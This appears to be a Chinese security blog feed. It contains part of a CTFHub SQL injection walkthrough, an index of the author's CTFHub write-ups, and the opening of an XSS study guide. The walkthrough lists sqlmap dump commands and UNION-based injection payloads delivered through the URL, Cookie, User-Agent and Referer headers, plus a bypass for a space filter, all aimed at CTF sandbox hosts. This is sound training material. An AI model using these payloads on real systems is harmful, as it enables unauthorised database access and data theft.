src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926736.png"></p><p>用sqlmap</p><p>我的sqlmap是安装在windows上的，在其目录下打开cmd，</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> http://challenge-<span class="hljs-number">503784</span>f287dcc449.<span class="hljs-keyword">sandbox</span>.ctfhub.<span class="hljs-keyword">com</span>:<span class="hljs-number">10800</span>/?id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>成功扫出注入漏洞（是时间盲注，不过无所谓，时间盲注和布尔盲注本质相近）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926728.png"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> http://challenge-<span class="hljs-number">503784</span>f287dcc449.<span class="hljs-keyword">sandbox</span>.ctfhub.<span class="hljs-keyword">com</span>:<span class="hljs-number">10800</span>/?id=<span class="hljs-number">1</span> --current-db<br></code></pre></td></tr></table></figure><p>查看当前数据库名</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926156.png"></p><p>查看表名</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> http://challenge-<span class="hljs-number">503784</span>f287dcc449.<span class="hljs-keyword">sandbox</span>.ctfhub.<span class="hljs-keyword">com</span>:<span class="hljs-number">10800</span>/?id=<span class="hljs-number">1</span> -D sqli –tables<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926100.png"></p><p>查看字段名</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> http://challenge-<span class="hljs-number">503784</span>f287dcc449.<span class="hljs-keyword">sandbox</span>.ctfhub.<span class="hljs-keyword">com</span>:<span class="hljs-number">10800</span>/?id=<span class="hljs-number">1</span> -D sqli -T flag --columns<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926248.png"></p><p>查看用户数据</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> http://challenge-<span class="hljs-number">503784</span>f287dcc449.<span class="hljs-keyword">sandbox</span>.ctfhub.<span class="hljs-keyword">com</span>:<span class="hljs-number">10800</span>/?id=<span class="hljs-number">1</span> -D sqli -T flag --dump<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926294.png"></p><h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>和布尔盲注一样，我们得不到什么有用的信息，用sqlmap</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926554.png"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> sqlmap.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">u</span> http://challenge-<span class="hljs-number">7</span>ab8ccdca17dd471.<span class="hljs-keyword">sandbox</span>.ctfhub.<span class="hljs-keyword">com</span>:<span class="hljs-number">10800</span>/?id=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926727.png"></p><p>剩下的与上一题相同</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926612.png"></p><h2 id="MySQL结构"><a href="#MySQL结构" class="headerlink" title="MySQL结构"></a>MySQL结构</h2><p>首页</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926030.png"></p><p>输个1，出数据了，一看URL，GET型注入，可以直接从URL上输入，也可以直接在ID框里输入，</p><p>这个题而且还把我们输入的SQL语句也拿出来了，似乎不需要闭合</p><p>持续输入，id只到2，输入3就没返回值了，所以只有两个id，1和2</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926770.png"></p><p>输入<code>1’</code>，验证了确实不需要闭合，没有返回数据说明出错了，但没有报错（不能用报错注入）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926764.png"></p><p>那就用联合注入，先看看有数据库给我们返回了几个值，</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>union select <span class="hljs-number">0#</span><br></code></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span>union select <span class="hljs-number">0</span>,<span class="hljs-number">1#</span><br></code></pre></td></tr></table></figure><p>逐次增加，当从0加到1时，有回显，确定返回值是两个（有时候返回值多于回显位，不一定每个返回的值都显示，这里很明显有两个回显位ID和Data）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926975.png"></p><p>接下来确定我们输入的值（即0，1）对应的回显位（注意union前的语句要是错的，前面语句是对的话，比如1，就会一直输出1和ctfhub，得不到我们想要的信息，我们之前试过，id只有1和2，所以输入-1肯定是错的，这一步其实可以和前面一步合并，直接拿-1去测返回值个数）</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span> <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p>发现0对应ID，1对应Data。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021926768.png"></p><p>接下来就是常规步骤，</p><p>在回显位上得到我们想要的信息，我选择在Data位上得到相关信息。</p><p>爆表名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>()#<br></code></pre></td></tr></table></figure><p>这个bfapxsidjd似乎是我们想要的，先试试它</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021927880.png"></p><p>爆字段名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">0</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span> = <span class="hljs-string">&#x27;bfapxsidjd&#x27;</span>#<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021927179.png"></p><p>爆用户数据</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-number">-1</span> union <span class="hljs-keyword">select</span> <span class="hljs-number">0</span>,group_concat(dijkatvoat) <span class="hljs-keyword">from</span> bfapxsidjd<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021927224.png"></p><h2 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h2><p>Cookie注入，抓包，发现hint</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021927256.png"></p><p>看着像url code，用在线URL 编码&#x2F;解码翻译试试</p><p>翻译成：输个1试试？</p><p>和之前提示一样</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021927469.png"></p><p>放包，出数据了，用联合注入试试</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021927472.png"></p><p>cookie上加payload，注意别加错位置</p><p>经尝试，数字型注入，不需要闭合，有两个返回值</p><p>0 union select 1,2–+</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021927295.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021927271.png"></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span>union select <span class="hljs-number">1</span>,group_concat(table_name) from information_schema.tables where table_schema = database()--+<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021927201.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021927010.png"></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span>union select <span class="hljs-number">1</span>,group_concat(column_name) from information_schema.columns where table_name = <span class="hljs-comment">&#x27;nsnlgmojmb&#x27;--+</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021927323.png"></p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span>union select <span class="hljs-number">1</span>,group_concat(zyrolpptir) from nsnlgmojmb--+<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021927603.png"></p><h2 id="UA注入"><a href="#UA注入" class="headerlink" title="UA注入"></a>UA注入</h2><p>把User-Agent处改为1</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021927806.png"></p><p>出现用户数据，那这里就和之前一样，直接注入就可</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021927120.png"></p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">-1</span> <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>猜猜看返回数据是不是只有两个（发现根本不需要注释）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021928703.png"></p><p>果然还是只有两个</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021928025.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema = <span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021928256.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>, group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span> = <span class="hljs-string">&#x27;narijgvpvg&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021928704.png"></p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">-<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(vlmxnrnwsf) <span class="hljs-keyword">from</span> narijgvpvg<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021928040.png"></p><h2 id="Refer注入"><a href="#Refer注入" class="headerlink" title="Refer注入"></a>Refer注入</h2><p>Referer注入没有referer？</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021928919.png"></p><p>自己构造一个</p><p><code>referer: 1</code></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021928608.png"></p><p>Ok了，在这注入</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021928296.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">referer</span>: -<span class="hljs-number">1</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021928838.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">referer: <span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021928378.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">referer: <span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-built_in">table_name</span> = <span class="hljs-string">&#x27;kclnvpdoln&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021928508.png"></p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">referer: -<span class="hljs-number">1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(lhdlppxexk) <span class="hljs-keyword">from</span> kclnvpdoln<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021928193.png"></p><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>输个1，发现和之前的题一样，按题目来看，是把空格过滤了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021928514.png"></p><p>针对这种情况，可以有很多方法，比如用其他符号替换、URL编码等，这里可以用&#x2F;**&#x2F;或者括号去替换空格</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">union</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021928427.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">tables</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span>table_schema=<span class="hljs-keyword">database</span>()<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021929998.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,group_concat(<span class="hljs-built_in">column_name</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>information_schema.<span class="hljs-keyword">columns</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">where</span><span class="hljs-comment">/**/</span><span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;notpyrplrk&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021929836.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">0</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,group_concat(bumpvvqaax)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>notpyrplrk<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021929043.png"></p><h2 id="综合训练-SQLI-LABS"><a href="#综合训练-SQLI-LABS" class="headerlink" title="综合训练 SQLI-LABS"></a>综合训练 SQLI-LABS</h2><p>实际上就是作者在文章开头说的sqli-labs靶场，推荐大家自己搭建一下，很简单而且可以节省金币。</p><p>具体搭建方法作者在自己文章里引用出来了。</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFHub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub技能树Web汇总</title>
    <link href="/2025/05/04/CTFHub%E6%8A%80%E8%83%BD%E6%A0%91Web%E6%B1%87%E6%80%BB/"/>
    <url>/2025/05/04/CTFHub%E6%8A%80%E8%83%BD%E6%A0%91Web%E6%B1%87%E6%80%BB/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/142747270">https://blog.csdn.net/2302_81178149/article/details/142747270</a></p></blockquote><p>CTFHub技能树相对而言比较长，都放在一篇文章里会极不方便，作者根据其不同的模块特意进行了分成多个文章。</p><p>为了方便大家进行查找，特意进行了汇总。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><p>前置技能（HTTP协议）：<a href="https://blog.csdn.net/2302_81178149/article/details/142718250?spm=1001.2014.3001.5501" title="前置技能(HTTP协议）-CTFHub_ctfhub web前置技能-CSDN博客">前置技能(HTTP协议）-CTFHub_ctfhub web前置技能-CSDN博客</a></p><p>信息泄露：<a href="https://blog.csdn.net/2302_81178149/article/details/142724244?spm=1001.2014.3001.5501" title="信息泄露-CTFHub-CSDN博客">信息泄露-CTFHub-CSDN博客</a></p><p>密码口令：<a href="https://blog.csdn.net/2302_81178149/article/details/142725955?spm=1001.2014.3001.5501" title="密码口令-CTFHub_ctfhub技能树web弱口令-CSDN博客">密码口令-CTFHub_ctfhub技能树web弱口令-CSDN博客</a></p><p>SQL注入：<a href="https://blog.csdn.net/2302_81178149/article/details/145423635?spm=1001.2014.3001.5501" title="SQL注入-CTFHub-CSDN博客">SQL注入-CTFHub-CSDN博客</a><a href="https://blog.csdn.net/2302_81178149/article/details/145423635?spm=1001.2014.3001.5501" title="web-SQL注入-CTFHub-CSDN博客">web-SQL注入-CTFHub-CSDN博客</a></p><p>XSS：<a href="https://blog.csdn.net/2302_81178149/article/details/145433520?spm=1001.2014.3001.5501" title="XSS-CTFHub-CSDN博客">XSS-CTFHub-CSDN博客</a></p><p>文件上传：<a href="https://blog.csdn.net/2302_81178149/article/details/145459083?spm=1001.2014.3001.5501" title="文件上传-CTFHub-CSDN博客">文件上传-CTFHub-CSDN博客</a></p><p>RCE：<a href="https://blog.csdn.net/2302_81178149/article/details/145460980?spm=1001.2014.3001.5501" title="RCE-CTFHub-CSDN博客">RCE-CTFHub-CSDN博客</a></p><p>SSRF：<a href="https://blog.csdn.net/2302_81178149/article/details/145477766?spm=1001.2014.3001.5501" title="SSRF-CTFHub-CSDN博客">SSRF-CTFHub-CSDN博客</a></p><h2 id="Web进阶"><a href="#Web进阶" class="headerlink" title="Web进阶"></a>Web进阶</h2><p>JSON Web Token：<a href="https://blog.csdn.net/2302_81178149/article/details/145458812?spm=1001.2014.3001.5501" title="JSON Web Token-CTFHub_ctfhub json web token-CSDN博客">JSON Web Token-CTFHub_ctfhub json web token-CSDN博客</a></p><p>Linux：等待官方完成更新</p><p>PHP：等待官方完成更新</p><p>后续Python、Java、Node.js的题目CTFHub官方还未更新</p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFHub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS学习总结</title>
    <link href="/2025/05/04/XSS%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"/>
    <url>/2025/05/04/XSS%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/142746504?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/142746504?spm=1001.2014.3001.5501</a></p></blockquote><p>我们下面进行下一个漏洞——XSS的学习，XSS是常见漏洞之一，是Web安全必学漏洞。</p><p>为探讨清楚XSS的诸多细节，<strong>我们特以经典的xss-labs进行从入门到进阶的专项训练</strong>。而本文是经由xss-labs训练总结而来，<strong>所以配合作者的xss-labs通关全详解食用更佳（怎么可以光学习不训练呢）</strong>。</p><p>xss-labs通关：<a href="https://blog.csdn.net/2302_81178149/article/details/142746914?spm=1001.2014.3001.5501" title="xss-labs通关全详解_xsslabs-CSDN博客">xss-labs通关全详解_xsslabs-CSDN博客</a></p><h2 id="基础知识汇总"><a href="#基础知识汇总" class="headerlink" title="基础知识汇总"></a>基础知识汇总</h2><h3 id="W3C标准"><a href="#W3C标准" class="headerlink" title="W3C标准"></a>W3C标准</h3><p>W3C标准：网页主要由三部分构成</p><p>结构：HTML**（简单掌握HTML，学会写常用标签、大体能看懂网站HTML源码即可）**</p><p>表现：CSS**（简单了解，知道作用就行）**</p><p>行为：JavaScript**（需要较深入了解，但具体的语法在练习中学习即可）**</p><p>HTML：定义了页面的结构和内容，包括文本、图像、链接</p><p>CSS：页面的样式和布局</p><p>JS：用于添加交互性和动态功能作用</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>XSS全称<strong>跨站脚本攻击</strong>(Cross Site Scripting)，为避免与层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS。</p><p>这是一种将任意 Javascript 代码插入到其他Web用户页面中执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在HTML页面里嵌入恶意代码。当用户浏览该页时，这些潜入在HTML中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如 cookie窃取等。</p><p>凡是数据输入或者交互的地方，都有可能发生xss。</p><p>XSS属于代码注入的一种，它允许攻击者将代码注入到网页，其他用户在浏览网页时就会受到影响。</p><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p><strong>反射型：</strong></p><p>又称非持久型XSS，这种攻击属于<strong>一次性攻击</strong>，只是简单的把用户输入的数据“反射”给浏览器。恶意代码一般存放于链接当中，攻击者将包含XSS代码的恶意链接发送给目标用户，当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS，也就是说攻击者往往需要诱使用户点击恶意链接才能攻击成功。</p><p>常见的注入点：网站的搜索栏、用户登录入口、输入表单等地方。常用来窃取客户端Cookie或钓鱼欺骗。</p><p>产生的原因一般是网站只是简单的将用户输入的数据直接或未经过完善的安全过滤就在浏览器中输入，导致输出的数据中存在可被浏览器执行的代码数据。</p><p><strong>存储型：</strong></p><p>又称持久型XSS，比反射型XSS更具有威胁性，攻击脚本会永久的存储在目标服务器的数据库或文件中，具有一定的隐蔽性。这种攻击方式多见于论坛、博客和留言板，攻击者在发帖的过程中，将恶意脚本与正常信息一起注入到留言中，随着留言被服务器存储下来，恶意脚本也被存储到存储器中。当其他用户浏览这个被注入恶意脚本的留言时，恶意脚本就会在用户的浏览器被执行。存储型XSS能将恶意代码永久的嵌入页面中，所有访问这个页面的用具都将成为受害者。</p><p>常见注入点：论坛、博客、留言板、网站的留言、评论、日志等交互处。</p><p>造成漏洞原因一般是由于Web应用程序对用户输入数据的不严格，导致Web应用程序将黑客输入的恶意跨站攻击数据信息保存在服务端的数据库或其他文件形式中。</p><p><strong>DOM型：</strong></p><p>DoM是文档对象模型（ Document Object Model）的缩写。它是HTML文档的对象表示，同时也是外部内容（例如 JavaScript）与HTML元素之间的接口。解析树的根节点是“Document”对象。DOM（ Document object model），使用DOM能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022054512.png" alt="Image 14"></p><p>DOM型的XSS是通过修改页面DOM节点数据信息而形成的XSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的 Javascript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。</p><p>并且DOM型XSS是基于JS上的，并不需要与服务器进行交互，它只发生在客户端处理数据的阶段。当用户请求一个包含XSS恶意代码的URL，服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码。</p><p><strong>事实上，DOM型也是一次性攻击，只不过由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。DOM型其实也属于非持久型XSS，只不过因DOM型有不与服务器端交互的特性，使得它与常规反射性XSS有明显区别（在防护上有天壤之别，不与服务器端交互使得它基本不能在服务器端做防护），故独立出来</strong></p><p>常见注入点：通过前端的dom节点形成的XSS漏洞，一般不与后台服务器产生数据交互，主要通过与前端页面进行闭合来产生xss。通过js脚本对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。</p><p>造成漏洞的原因：这是一种基于DOM的跨站，这是客户端脚本本身解析不正确导致的安全问题。</p><p><strong>总述：</strong></p><p><strong>反射型与持久性XSS在payload上区别不大，主要区别在于生效位置不同而导致的持久性不同。反射型是一次性攻击，往往存在于链接之中，需要点击才能生效；持久性可能注入在网站的评论区，随网站加载即可生效，可以长期有效。至于DOM型可以看作一种特殊的反射型XSS，但其有不与服务器端交互的特性，使得它与常规反射性XSS有明显区别（在防护上有天壤之别，不与服务器端交互使得它基本不能在服务器端做防护），故独立出来。</strong></p><h2 id="Payload（常用标签）"><a href="#Payload（常用标签）" class="headerlink" title="Payload（常用标签）"></a>Payload（常用标签）</h2><p><strong>XSS常见的触发标签：</strong></p><p><a href="https://blog.csdn.net/LYJ20010728/article/details/116462782" title="XSS常见的触发标签_xss&lt; img src οnerrοr&#x3D;alt&#x3D;&#39;&#39;+document.domain&gt;”怎么触发-CSDN博客">XSS常见的触发标签_xss&lt; img src 